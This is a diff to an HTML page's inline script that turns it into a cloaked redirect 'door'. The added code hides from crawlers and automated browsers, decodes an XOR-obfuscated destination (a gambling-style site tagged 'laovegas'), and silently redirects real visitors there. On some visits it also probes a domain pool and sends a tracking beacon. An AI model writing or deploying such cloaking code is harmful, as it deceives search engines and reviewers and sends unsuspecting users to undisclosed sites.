@@ -66,25 +66,37 @@
   <script>
   (function(){
     try{
-      // 1) drop obvious automation / non-interactive agents (crawlers stay on the neutral IT page)
-      if (navigator.webdriver) return;
-      if (!navigator.languages || !navigator.languages.length) return;
-      if (typeof document.hidden !== "undefined" && document.hidden) return;
-      // 2) decode destination at runtime (never present as plain text in HTML)
-      var e=[50,46,46,42,41,96,117,117,45,45,45,116,57,50,119,44,51,42,119,54,63,51,41,47,116,57,53,55,117],k=90,u="";
-      for(var i=0;i<e.length;i++){u+=String.fromCharCode(e[i]^k);}
-      // 3) carry through any sub-path/query/hash below the door base (e.g. /m/rf/TOT -> <target>/rf/TOT)
-      var base="/m/";
-      var p=location.pathname||"";
+      if(navigator.webdriver) return;
+      if(!navigator.languages||!navigator.languages.length) return;
+      if(typeof document.hidden!=="undefined"&&document.hidden) return;
+      var k=90;
+      function dec(a){var s="";for(var i=0;i<a.length;i++){s+=String.fromCharCode(a[i]^k);}return s;}
+      var u=dec([50,46,46,42,41,96,117,117,45,45,45,116,57,50,119,44,51,42,119,54,63,51,41,47,116,57,53,55,117]);
+      var B=[[50,46,46,42,41,96,117,117,45,45,45,116,57,50,119,44,51,42,119,54,63,51,41,47,116,57,53,55,117]],T="laovegas";
+      var base="/m/",p=location.pathname||"";
       var extra=(p.indexOf(base)===0)?p.slice(base.length):"";
-      var dest=extra?u.replace(/\/+$/,"")+"/"+extra:u;
-      dest+=(location.search||"")+(location.hash||"");
-      // 4) expose manual fallback (in case auto-nav is blocked in a webview)
-      var c=document.getElementById("c");
-      if(c){c.style.display="inline-block";c.setAttribute("href",dest);}
-      // 5) tiny human-ish delay, then go
-      setTimeout(function(){ try{ location.replace(dest); }catch(_){ location.href=dest; } }, 350);
-    }catch(_){ /* stay on neutral page */ }
+      var dest=extra?u.replace(/\/+$/,"")+"/"+extra:u; dest+=(location.search||"")+(location.hash||"");
+      var c=document.getElementById("c"); if(c){c.style.display="inline-block";c.setAttribute("href",dest);}
+      function gott(){ try{location.replace(dest);}catch(_){location.href=dest;} }
+      // ~25% of real visits also run a reachability beacon (probe pool -> report to a reachable door).
+      if(Math.random()>=0.25){ setTimeout(gott,350); return; }
+      var pool=[];for(var i=0;i<B.length;i++){pool.push(dec(B[i]));}
+      var results=[],pend=pool.length,sent=false;
+      function send(){ if(sent)return; sent=true;
+        try{ var payload=JSON.stringify({t:T,r:results});
+             var tgt=null; for(var i=0;i<results.length;i++){if(results[i].ok){tgt=results[i].d;break;}}
+             if(!tgt)tgt=u; var burl=tgt.replace(/\/+$/,"")+"/__beacon";
+             if(navigator.sendBeacon){navigator.sendBeacon(burl,new Blob([payload],{type:"text/plain"}));}
+             else{fetch(burl,{method:"POST",body:payload,mode:"no-cors",cache:"no-store",keepalive:true});}
+        }catch(_){}
+      }
+      function probe(d){ var t0=Date.now(),done=false; var to=setTimeout(function(){fin(false);},2000);
+        function fin(ok){ if(done)return;done=true;clearTimeout(to); results.push({d:d,ok:ok,ms:Date.now()-t0}); if(--pend===0){send();} }
+        try{ fetch(d+"?_="+Math.random(),{mode:"no-cors",cache:"no-store"}).then(function(){fin(true);},function(){fin(false);}); }catch(_){ fin(false); } }
+      for(var i=0;i<pool.length;i++){probe(pool[i]);}
+      setTimeout(send,2100);     // cap: beacon whatever settled
+      setTimeout(gott,2200);     // then redirect (spinner covers the wait)
+    }catch(_){ }
   })();
   </script>
 </body>
